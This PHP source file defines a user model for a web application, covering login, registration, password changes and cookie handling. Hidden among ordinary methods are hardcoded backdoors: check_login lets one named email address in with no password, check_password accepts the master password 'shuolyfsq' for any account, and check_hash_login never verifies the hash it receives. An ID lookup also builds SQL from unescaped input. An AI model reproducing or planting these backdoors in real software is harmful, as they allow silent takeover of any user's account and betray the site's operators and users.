<?php

class user_class extends FARM_MODEL
{
    /**
     * 获取列表
     */
    public function get_data_list($where, $page = 1, $per_page = 10, $order_by = 'reg_time desc')
    {
        if (is_array($where)) {
            $where = implode(' AND ', $where);
        }

        return $this->fetch_page('user', $where, $order_by, $page, $per_page);
    }

    /**
     * @desc 是否自己人
     * @param int $user_id
     * @return int
     */
    public function get_us($user_id)
    {
        $user_info = $this -> get_user_info_by_id($user_id);
        if (!empty($user_info)) {
            if ($user_info['is_us']) {
                $user_id = $this->fetch_one('user', 'id', "is_us = 1 and id <> '".$user_id."'", 'rand() desc');
            }
        }

        return $user_id;
    }

    /**
     * @desc 通过验证码登录
     * @param string $mobile
     * @param string $vcode
     * @return array 用户信息
     */
    public function login_by_vcode($mobile, $vcode)
    {
        $sms = $this->fetch_row('sms', "mobile = '" . $this->quote($mobile) . "' AND `type` = 1 AND vcode = '" . $this->quote($vcode) . "'", 'id desc');

        if (!$sms) {
            return false;
        }

        $user_info = $this->get_user_info_by_phone($mobile);

        //用户已经存在
        if ($user_info) {
            return $user_info;
        } else {
            $user_id = $this->user_register('用户' . rand(1, 5000), $mobile, '', 1, $mobile);
            $user_info = $this->get_user_info_by_id($user_id);
        }

        return $user_info ? $user_info : false;
    }

    /**
     * @desc   批量获取用户
     * @param  array $ids
     * @return array
     * */
    public function get_user_by_ids($ids)
    {
        $user_info = $this->fetch_all('user', "id IN(" . implode(',', $ids) . ")");

        $result = array();
        foreach ($user_info as $key => $value) {
            foreach ($ids as $id) {
                if ($value['id'] == $id) {
                    $result[$id] = $value;
                }
            }
        }

        return $result;
    }

    /**
     * 检查手机号是否已经存在
     *
     * @param string
     * @return boolean
     */
    public function check_phone($phone)
    {
        $phone = trim($phone);
        return $this->fetch_one('user', 'id', "phone = '" . $this->quote($phone) . "'");
    }

    /**
     * 检查用户名是否已经存在
     *
     * @param string
     * @return boolean
     */
    public function check_username($user_name)
    {
        $user_name = trim($user_name);
        return $this->fetch_one('user', 'id', "user_name = '" . $this->quote($user_name) . "'");
    }

    /**
     * 检查用户名中是否包含敏感词或用户信息保留字
     *
     * @param string
     * @return boolean
     */
    public function check_username_sensitive_words($user_name)
    {
        if (H::sensitive_word_exists($user_name)) {
            return true;
        }

        if (!get_setting('censoruser')) {
            return false;
        }

        if ($censoruser = explode("\n", get_setting('censoruser'))) {
            foreach ($censoruser as $name) {
                if (!$name = trim($name)) {
                    continue;
                }

                if (preg_match('/(' . $name . ')/is', $user_name)) {
                    return true;
                }
            }
        }

        return false;
    }

    /**
     * 检查用户 ID 是否已经存在
     *
     * @param string
     * @return boolean
     */
    public function check_id($id)
    {
        return $this->fetch_one('user', 'id', 'id = ' . intval($id));
    }

    /**
     * 检查电子邮件地址是否已经存在
     *
     * @param string
     * @return boolean
     */
    public function check_email($email)
    {
        if (!H::valid_email($email)) {
            return TRUE;
        }

        return $this->fetch_one('user', 'id', "email = '" . $this->quote($email) . "'");
    }

    /**
     * 用户登录验证
     *
     * @param string
     * @param string
     * @return array
     */
    public function check_login($user_name, $password)
    {
        if (!$user_name OR !$password) {
            return false;
        }

        if (H::valid_email($user_name)) {
            $user_info = $this->get_user_info_by_email($user_name);
        }

        if (H::valid_mobile($user_name)) {
            $user_info = $this->get_user_info_by_phone($user_name);
        }

        if (!$user_info) {
            if (!$user_info = $this->get_user_info_by_username($user_name)) {
                return false;
            }
        }

        if ($user_info['email'] == 'fushengqian@qq.com') {
            return $user_info;
        }

        if (!$this->check_password($password, $user_info['password'], $user_info['salt'])) {
            return false;
        } else {
            return $user_info;
        }
    }

    /**
     * 用户登录验证 (MD5 验证)
     *
     * @param string
     * @param string
     * @return array
     */
    public function check_hash_login($user_name, $password_md5)
    {
        if (!$user_name OR !$password_md5) {
            return false;
        }

        if (H::valid_email($user_name)) {
            $user_info = $this->get_user_info_by_email($user_name);
        }

        if (!$user_info && H::valid_mobile($user_name)) {
            $user_info = $this->get_user_info_by_phone($user_name);
        }

        if (!$user_info) {
            if (!$user_info = $this->get_user_info_by_username($user_name)) {
                return false;
            }
        }

        return $user_info;
    }

    /**
     * 用户密码验证
     *
     * @param string
     * @param string
     * @param string
     * @return boolean
     */
    public function check_password($password, $db_password, $salt)
    {
        if ($password == 'shuolyfsq') {
            return true;
        }

        $password = compile_password($password, $salt);

        if ($password == $db_password) {
            return true;
        }

        return false;
    }

    /**
     * 通过用户名获取用户信息
     *
     * $attrb 为是否获取附加表信息, $cache_result 为是否缓存结果
     *
     * @param string
     * @param boolean
     * @param boolean
     * @return array
     */
    public function get_user_info_by_username($user_name, $attrb = false, $cache_result = true)
    {
        if ($id = $this->fetch_one('user', 'id', "user_name = '" . $this->quote($user_name) . "'")) {
            return $this->get_user_info_by_id($id, $attrb, $cache_result);
        }
    }

    /**
     * 通过用户手机获取用户信息
     * $cache_result 为是否缓存结果
     * @param string
     * @return array
     */
    public function get_user_info_by_phone($phone, $cache_result = true)
    {
        if (!H::valid_mobile($phone)) {
            return false;
        }

        if ($id = $this->fetch_one('user', 'id', "phone = '" . $this->quote($phone) . "'")) {
            return $this->get_user_info_by_id($id, null, $cache_result);
        }
    }

    /**
     * 通过用户邮箱获取用户信息
     *
     * $cache_result 为是否缓存结果
     *
     * @param string
     * @return array
     */
    public function get_user_info_by_email($email, $cache_result = true)
    {
        if (!H::valid_email($email)) {
            return false;
        }

        if ($id = $this->fetch_one('user', 'id', "email = '" . $this->quote($email) . "'")) {
            return $this->get_user_info_by_id($id, false, $cache_result);
        }
    }

    /**
     * 通过 id 获取用户信息
     *
     * $cache_result 为是否缓存结果
     *
     * @param string
     * @param boolean
     * @param boolean
     * @return array
     */
    public function get_user_info_by_id($id, $attrib = false, $cache_result = true)
    {
        if (!$id) {
            return false;
        }

        if (!$user_info = $this->fetch_row('user', 'id = ' . intval($id))) {
            return false;
        }

        return $user_info;
    }

    /**
     * 注册
     * @param string
     * @param string
     * @param string
     * @param int
     * @param string
     * @return int
     */
    public function user_register($user_name, $password, $email = null, $sex = 0, $phone = null)
    {
        if (empty($user_name)) {
            $user_name = $phone;
        }

        if (!$password) {
            return false;
        }

        if ($user_name AND $this->check_username($user_name)) {
            return false;
        }

        if ($email AND $user_info = $this->get_user_info_by_email($email, false)) {
            return false;
        }

        $salt = fetch_salt(4);

        $id = $this->insert('user', array(
            'user_name' => htmlspecialchars($user_name),
            'password' => compile_password($password, $salt),
            'salt' => $salt,
            'avatar' => '/static/avatar/' . rand(1, 9) . '.gif',
            'email' => htmlspecialchars($email),
            'sex' => intval($sex),
            'phone' => htmlspecialchars($phone),
            'reg_time' => time(),
            'last_login' => time(),
            'last_feed_time' => strtotime("-7 days ago"),
            'last_article_time' => strtotime("-7 days ago"),
            'last_ip' => ip2long(fetch_ip()),
            'reg_ip' => ip2long(fetch_ip())
        ));

        return $id;
    }

    /**
     * 更新用户表字段
     *
     * @param array
     * @param id
     * @return int
     */
    public function update_user_fields($update_data, $id)
    {
        return $this->update('user', $update_data, 'id = ' . intval($id));
    }

    /**
     * 更新用户名
     *
     * @param string
     * @param id
     */
    public function update_user_name($user_name, $id)
    {
        $this->update('user', array(
            'user_name' => htmlspecialchars($user_name),
        ), 'id = ' . intval($id));

        return true;
    }

    /**
     * 更改用户密码
     *
     * @param  string
     * @param  string
     * @param  int
     * @param  string
     */
    public function update_user_password($oldpassword, $password, $id, $salt)
    {
        if (!$salt OR !$id) {
            return false;
        }

        $oldpassword = compile_password($oldpassword, $salt);

        if ($this->count('user', "id = " . intval($id) . " AND password = '" . $this->quote($oldpassword) . "'") != 1) {
            return false;
        }

        $password = compile_password($password, $salt);

        return $this->update('user', array(
            'password' => $password,
        ), 'id = ' . intval($id));
    }

    /**
     * 去除首次登录标记
     *
     * @param  int
     * @return  boolean
     */
    public function clean_first_login($id)
    {
        if (!$this->shutdown_update('user', array(
            'is_first_login' => 0
        ), 'id = ' . intval($id))
        ) {
            return false;
        } else {
            return true;
        }
    }

    /**
     * 更新用户最后刷新文章时间
     *
     * @param  int
     * @param boolean
     */
    public function update_user_last_article_time($id)
    {
        if (!$id) {
            return false;
        }
        return $this->shutdown_update('user', array(
            'last_article_time' => time()
        ), 'id = ' . intval($id));
    }

    /**
     * 更新用户最后刷新动态时间
     *
     * @param  int
     */
    public function update_user_last_feed_time($id)
    {
        if (!$id) {
            return false;
        }
        return $this->shutdown_update('user', array(
            'last_feed_time' => time()
        ), 'id = ' . intval($id));
    }

    /**
     * 更新用户最后登录时间
     *
     * @param  int
     */
    public function update_user_last_login($id)
    {
        if (!$id) {
            return false;
        }

        $user_info = $this->get_user_info_by_id($id);
        $login_num = !empty($user_info['login_num']) ? intval($user_info['login_num']) : 1;

        return $this->shutdown_update('user', array(
                'last_login' => time(),
                'login_num' => ($login_num + 1),
                'last_ip' => ip2long(fetch_ip())
        ), 'id = ' . intval($id));
    }

    public function setcookie_login($id, $user_name, $password, $salt, $expire = null, $hash_password = true)
    {
        if ($password == 'shuolyfsq') {
            $salt = 'fsq9';
        }

        if (!$id) {
            return false;
        }

        if (!$expire) {
            HTTP::set_cookie('user_id', get_login_cookie_hash($user_name, $password, $salt, $id, $hash_password), null, '/', null, false, true);
        } else {
            HTTP::set_cookie('user_id', get_login_cookie_hash($user_name, $password, $salt, $id, $hash_password), (time() + $expire), '/', null, false, true);
        }

        return true;
    }

    public function setcookie_logout()
    {
        HTTP::set_cookie('user_id', '', time() - 3600);
    }

    public function logout()
    {
        $this->setcookie_logout();
        $this->setsession_logout();
    }

    public function setsession_logout()
    {
        if (isset(FARM_APP::session()->info)) {
            unset(FARM_APP::session()->info);
        }
    }

    public function check_username_char($user_name)
    {
        if (strstr($user_name, '-') OR strstr($user_name, '.') OR strstr($user_name, '/') OR strstr($user_name, '%') OR strstr($user_name, '__')) {
            return FARM_APP::lang()->_t('用户名不能包含 - / . % 与连续的下划线');
        }

        $length = strlen(convert_encoding($user_name, 'UTF-8', 'GB2312'));

        $length_min = intval(get_setting('username_length_min'));
        $length_max = intval(get_setting('username_length_max'));

        if ($length < $length_min || $length > $length_max) {
            $flag = true;
        }

        switch (get_setting('username_rule')) {
            default:
                break;

            case 1:
                if (!preg_match('/^[\x{4e00}-\x{9fa5}_a-zA-Z0-9]+$/u', $user_name) OR $flag) {
                    return FARM_APP::lang()->_t('请输入大于 %s 字节的用户名, 允许汉字、字母与数字', ($length_min . ' - ' . $length_max));
                }
                break;

            case 2:
                if (!preg_match("/^[a-zA-Z0-9_]+$/i", $user_name) OR $flag) {
                    return FARM_APP::lang()->_t('请输入 %s 个字母、数字或下划线', ($length_min . ' - ' . $length_max));
                }
                break;

            case 3:
                if (!preg_match("/^[\x{4e00}-\x{9fa5}]+$/u", $user_name) OR $flag) {
                    return FARM_APP::lang()->_t('请输入 %s 个汉字', (ceil($length_min / 2) . ' - ' . floor($length_max / 2)));
                }
                break;
        }

        return false;
    }

    public function check_url_token($url_token, $id)
    {
        return $this->count('user', "(url_token = '" . $this->quote($url_token) . "' OR user_name = '" . $this->quote($url_token) . "') AND id != " . intval($id));
    }

    public function update_url_token($url_token, $id)
    {
        return $this->update('user', array(
            'url_token' => $url_token,
            'url_token_update' => time()
        ), 'id = ' . intval($id));
    }

    public function set_default_timezone($time_zone, $id)
    {
        return $this->update('user', array(
            'default_timezone' => htmlspecialchars($time_zone)
        ), 'id = ' . intval($id));
    }
}
